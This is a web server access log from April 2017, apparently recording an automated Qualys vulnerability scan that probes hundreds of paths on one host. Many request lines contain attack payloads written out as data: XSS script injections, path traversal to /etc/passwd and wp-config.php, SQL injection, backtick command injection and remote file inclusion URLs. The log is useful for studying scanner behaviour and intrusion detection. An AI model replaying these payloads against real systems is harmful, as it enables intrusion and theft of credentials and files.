47.150.129.197 - - [02/Apr/2017:09:54:55 +0000] "GET /robots.txt HTTP/1.1" 200 26
10.79.217.2 - - [04/Apr/2017:18:03:30 +0000] "GET /peel/ HTTP/1.1" 404 293
10.79.217.2 - - [04/Apr/2017:18:03:30 +0000] "POST /login.php HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:30 +0000] "GET /awstats.pl  HTTP/1.1" 404 288
10.79.217.2 - - [04/Apr/2017:18:03:30 +0000] "GET /PEEL/ HTTP/1.1" 404 293
10.79.217.2 - - [04/Apr/2017:18:03:30 +0000] "GET /robohelp/admin/admin.jsp HTTP/1.1" 404 312
10.79.217.2 - - [04/Apr/2017:18:03:30 +0000] "GET /awstats.pl?debug=1 HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /index.php HTTP/1.0" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /Peel/ HTTP/1.1" 404 293
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /awstats.pl?debug=1 HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /?feed=rss2 HTTP/1.1" 200 55
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /bookmarks/ HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /xmlrpcs.inc HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /wp-config.php~ HTTP/1.1" 404 302
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /Post%20Nuke/ HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /order.asp HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /Post%20Nuke/html/ HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /search?client=asdfghjklq5&site=asdfghjklq&output=xml_no_dtd&q=asdfghjklq&proxystylesheet=http://Qualys/ HTTP/1.1" 404 294
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "OPTIONS * HTTP/1.0" 200 -
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /post-nuke/ HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /post-nuke/html/ HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "OPTIONS / HTTP/1.0" 200 -
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /include/inc_act/act_newsletter.php HTTP/1.1" 404 322
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /Post-Nuke/ HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /awstats.pl HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /Post-Nuke/html/ HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /horde/ HTTP/1.1" 404 294
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /index.html.ca HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /index.html.de HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /bin/ HTTP/1.1" 404 292
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /wagora/ HTTP/1.1" 404 295
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /index.html.dk HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /index.html.ee HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /nfuse/ HTTP/1.1" 404 294
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /NFuse/ HTTP/1.1" 404 294
10.79.217.2 - - [04/Apr/2017:18:03:31 +0000] "GET /index.html.el HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /NFuse151/ HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /index.html.en HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /index.html.es HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /NFuse16/ HTTP/1.1" 404 296
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /index.html.et HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /Citrix/nfuse/ HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /index.html.fr HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /Citrix/NFuse/ HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /index.html.nl HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /Citrix/NFuse151/ HTTP/1.1" 404 304
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /index.html.nn HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /Citrix/NFuse16/ HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /expanded.php?conf=../../../../../../../etc/passwd HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /index.html.no HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /Citrix/NFuse/ASP/ HTTP/1.1" 404 305
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /philboard.mdb HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /index.html.pt HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /Citrix/NFuse151/ASP/ HTTP/1.1" 404 308
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /b2-include/b2functions.php?b2inc=http://www.qualys.com/asdfgh HTTP/1.1" 404 314
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /index.html.pt-br HTTP/1.1" 404 304
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /phpinfo.php?variable=<script>alert('QualysXSS');</script> HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /Citrix/NFuse16/ASP/ HTTP/1.1" 404 307
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /index.html.ru.iso-ru HTTP/1.1" 404 308
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /NFuse/ASP/ HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:32 +0000] "GET /admin/phpinfo.php?variable=<script>alert('QualysXSS');</script> HTTP/1.1" 404 305
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /NFuse151/ASP/ HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /administrator/phpinfo.php?variable=<script>alert('QualysXSS');</script> HTTP/1.1" 404 313
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /nph-exploitscanget.cgi?host=`cat%20/etc/passwd`&port=443&errchk=0&idsbypass=0 HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /NFuse16/ASP/ HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /nph-exploitscanget.cgi?host=%3Cscript%3Ealert%28QualysTest%29%3C%2Fscript%3E&port=80&idsbypass=0&errchk=1 HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /Citrix/NFuse/JSP/ HTTP/1.1" 404 305
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /index.php3?action=telecharger&fichier=Q1U2A3L4Y5S HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /Citrix/NFuse151/JSP/ HTTP/1.1" 404 308
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /Citrix/NFuse16/JSP/ HTTP/1.1" 404 307
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /include/ixmail_box.inc.php HTTP/1.1" 404 314
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /ixmail_netattach.php?file=q1u2a3l4y5s.php HTTP/1.1" 404 308
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /NFuse/JSP/ HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /viewtopic.php?sid=1&topic_id=' HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /NFuse151/JSP/ HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /ashnews.php HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /NFuse16/JSP/ HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /Citrix/NFuse/Token/ HTTP/1.1" 404 307
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /shopexd.asp?catalogid='666 HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /Citrix/NFuse151/Token/ HTTP/1.1" 404 310
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /parse-file?TEMPLATE=%3Cscript%3Ealert('QualysXSSTest')%3C/script%3E HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /NFuse/Token/ HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /parse-file?TEMPLATE=QualysPDTest HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /NFuse151/Token/ HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /?category=xxxxxx&parent=0&page=x&/' HTTP/1.1" 200 55
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /recipe/recipe/index.php HTTP/1.1" 404 311
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /ssgbook/ HTTP/1.1" 404 296
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /admin.php?adsess='><script>window.open%20(window.location.search.substring%20(78));</script> HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "POST / HTTP/1.1" 200 55
10.79.217.2 - - [04/Apr/2017:18:03:33 +0000] "GET /cyboard/ HTTP/1.1" 404 296
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /?page=' HTTP/1.1" 200 55
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /q4u5a1l1y0s.php HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /phplite/ HTTP/1.1" 404 296
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET / HTTP/1.1" 400 396
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /admin.php?act=write&username=admin&password=admin&aduser=QTest&adpass=QTest HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /php-lite/ HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /loginPage.imss HTTP/1.1" 404 302
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /anyboard.cgi/?cmd=sinfo&all=1 HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /phplinkat/ HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /?q[]=x HTTP/1.1" 200 55
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /gbrowse?help=../../../../../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 295
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /graph.php?current_language=/../../../../../../../../etc/passwd%00&module=Accounts&action=Import&parenttab=Support HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /phpLinkat/ HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /admin/admin.php?adminpy=1 HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /links/ HTTP/1.1" 404 294
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /gmap/view_overlay.php?overlay_type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F/etc/passwd%00 HTTP/1.1" 404 309
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /invitefriends.php3 HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /link/ HTTP/1.1" 404 293
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /newsletters/edition.php/\"><script>alert('QUALYS_XSS');</script> HTTP/1.1" 404 371
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /esp?PAGE=%3Cscript%3Ealert(12345)%3C/script%3E HTTP/1.1" 404 291
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /admin/login.php HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /greetings/ HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /lednews.cgi HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /index.php?Products&oscommerce-tshirt HTTP/1.1" 404 287
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /linkat/ HTTP/1.1" 404 295
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /vdesk/admincon/images/vfolder/i3/banner.gif HTTP/1.1" 404 331
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /login.php?error=<script>alert(12345)</script> HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /htdocs/index.php HTTP/1.0" 404 304
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /postcard/ HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /CSCOnm/servlet/login/login.jsp HTTP/1.1" 404 318
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /cf.html?<script>alert(41512)</script> HTTP/1.1" 404 295
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /index.php?Admin&Login HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /card/ HTTP/1.1" 404 293
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /example/HelloWorld.action HTTP/1.1" 404 313
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /lostpassword.php?action=lost&email=fake' HTTP/1.1" 404 304
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /news.php HTTP/1.0" 404 296
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /sitedir/ HTTP/1.1" 404 296
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /Logon.aspx HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /index.php HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /emml.php HTTP/1.1" 404 296
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /cards/ HTTP/1.1" 404 294
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /Documentation.html HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /bin/view/Main/WebHome?cover=print HTTP/1.1" 404 309
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /esp?PAGE=cfyz HTTP/1.1" 404 291
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "POST /admin/libraries/ajaxfilemanager/ajax_create_folder.php HTTP/1.1" 404 342
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /DCShop/orders/ HTTP/1.1" 404 302
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /index.php?option=com_jumi&fileid=-530%27%20UNION%20SELECT%202,concat%280x6a,0x75,0x6d,0x69,0x5f,0x73,0x71,0x6c,0x5f,0x69,0x6e,0x6a,0x65,0x63,0x74,0x69,0x6f,0x6e%29,null,null,null,0,0,1%20--%20%27 HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /powerslave,id,CFYZ HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /spywall/login.php HTTP/1.1" 404 305
10.79.217.2 - - [04/Apr/2017:18:03:34 +0000] "GET /DCShop/auth_data/ HTTP/1.1" 404 305
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /interface/login/login_title.php HTTP/1.1" 404 319
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /prayerboard.php?do=st&id=' HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /www/admin/index.php HTTP/1.1" 404 307
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /DCShop/ HTTP/1.1" 404 295
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /CFIDE/administrator/datasources/derbyEmbedded.cfm?dsn=cfartgallery&\"></XSS/*-*/STYLE=xss:e/**/xpression(window.location=\"http://www.qualys.com/\")>=1 HTTP/1.1" 404 337
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /index.php3?Rubrique=%3Cscript%3Ealert(12345)%3C/script%3E HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /secure/Dashboard.jspa HTTP/1.1" 404 309
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /imagefolio/ HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "POST /CFIDE/administrator/login.cfm HTTP/1.1" 404 317
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /administrator/index.php HTTP/1.1" 404 311
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /url.jsp?foo=<script>alert(12345)</script> HTTP/1.1" 404 295
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /cgibin/imagefolio/ HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /CFIDE/adminapi/administrator.cfc?method=login&adminpassword=&rdsPasswordAllowed=true HTTP/1.1" 404 320
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /servlet/ContentServer?pagename=<body%20onload=alert(document.cookie);> HTTP/1.1" 404 309
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /administrator/manifests/files/joomla.xml HTTP/1.1" 404 328
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /if/ HTTP/1.1" 404 291
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /CFIDE/adminapi/administrator.cfc?method=login&adminpassword=&rdsPasswordAllowed=true HTTP/1.1" 404 320
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /search.php?zoom_query=<script>alert(document.cookie)</script> HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /Documentation.html HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /cgibin/if/ HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /asktheoracle.php?type=searchstr&query=<script>alert('QUALYSXSS')</script> HTTP/1.1" 404 304
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /search.php3?zoom_query=<script>alert(document.cookie)</script> HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /install.php?action=step3 HTTP/1.1" 404 299
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /geeklog/ HTTP/1.1" 404 296
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/%0d HTTP/1.1" 404 361
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /search.asp?zoom_query=<script>alert(document.cookie)</script> HTTP/1.1" 404 298
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /login.jsp HTTP/1.1" 404 297
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /mt.cgi HTTP/1.1" 404 294
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /vAuthenticate/ HTTP/1.1" 404 302
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /search HTTP/1.1" 404 294
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /wp-content/plugins/wp-ultimate-email-marketer/campaign/campaignone.php?siteurl=')\"<script>alert(\"QUALYSXSS\")</script> HTTP/1.1" 404 358
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /main.php HTTP/1.1" 404 296
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /vauthenticate/ HTTP/1.1" 404 302
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /new-visitor.inc.php?lvc_include_dir=http://www.qualys.com/ HTTP/1.1" 404 307
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /wp-content/plugins/wp-miniaudioplayer/maptinymce/maplayertinymce.php?url=&audiotitle=&skin=black&width=\"%2F><script>alert(\"QUALYSXSS\")%3B<%2Fscript>&volume=\"%2F><script>alert(\"QUALYSXSS\")%3B<%2Fscript># HTTP/1.1" 404 356
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /wp-content/plugins/google-document-embedder/libs/pdf.php?fn=yddq.pdf&file=../../../../wp-config.php HTTP/1.1" 404 344
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /vAuth/ HTTP/1.1" 404 294
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /example/HelloWorld.action HTTP/1.1" 404 313
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /files.inc.php HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /appliance/login HTTP/1.1" 404 303
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /services/javascript.php HTTP/1.1" 404 311
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /include/images/poweredby_sugarcrm.png HTTP/1.1" 404 325
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /services/javascript.php HTTP/1.1" 404 311
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /login_up.php3 HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /core/install/upgrade.php HTTP/1.1" 404 312
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /tiki-index.php HTTP/1.1" 404 302
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /webroot/addons/row_manager/row_manager.js HTTP/1.1" 404 329
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /install/upgrade.php HTTP/1.1" 404 307
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /console/portal/0/Welcome.jsp HTTP/1.1" 404 316
10.79.217.2 - - [04/Apr/2017:18:03:35 +0000] "GET /Documentation.html HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET /Documentation.html HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET /wp-content/plugins/mobilechief-mobile-site-creator/lib/jquery-validate/demo/captcha/index.php/\"/><script>alert(\"QUALYS_XSS\");</script> HTTP/1.1" 404 452
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET /doc/html/index.html HTTP/1.1" 404 307
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET /web-console/ServerInfo.jsp HTTP/1.1" 404 314
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "TRACE /QUALYS12680.html HTTP/1.1" 200 107
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET /web-console/ServerInfo.jsp HTTP/1.1" 404 314
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "TRACK /QUALYS12680.html HTTP/1.1" 501 313
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET /wdk/redirect.jsp?ReLoad=1385372400564&__dmfUrl=javascript:alert(\"QUALYS_XSS\")//; HTTP/1.1" 404 304
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "POST /servlet/ConsoleServlet?ActionType=ConsoleLog HTTP/1.1" 404 300
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET /console/login/LoginForm.jsp HTTP/1.1" 404 315
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET /Clients/plugins/common/help/releasenotes/docs/suite_release_notes.html HTTP/1.1" 404 358
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET /sifr.js HTTP/1.1" 404 295
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET /textpattern/setup/index.php/\"><script>alert(/QUALYSXSSTEST/);</script>/index.php HTTP/1.1" 404 388
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET /wp-content/plugins/newsletter/subscription/page.php?alert=alert(\"QUALYSXSS\") HTTP/1.1" 404 339
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET /wp-content/plugins/advanced-dewplayer/admin-panel/download-file.php?dew_file=upload.js HTTP/1.1" 404 355
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "POST /timeclock.php HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET /interface/javascript/windowManagerNull.js HTTP/1.1" 404 329
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET /help/en/book01.htm HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET /portal/kb.php HTTP/1.1" 404 301
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET /help/en/book01.htm HTTP/1.1" 404 306
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET /example/HelloWorld.action HTTP/1.1" 404 313
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET /component/main HTTP/1.1" 404 302
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET /eRoomASP/DlgChooseClient.asp HTTP/1.1" 404 316
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET /eRoomASP/DlgChooseClient.asp HTTP/1.1" 404 316
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET /eRoomASP/DlgChooseClient.asp HTTP/1.1" 404 316
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET //wp-content/plugins/wp-symposium/get_album_item.php?size=version%28%29%20;%20-- HTTP/1.1" 404 338
10.79.217.2 - - [04/Apr/2017:18:03:36 +0000] "GET /wp-content/plugins/recommend-a-friend/inc/raf_form.php?current_url=\"/><script>alert(12345);</script> HTTP/1.1" 404 342
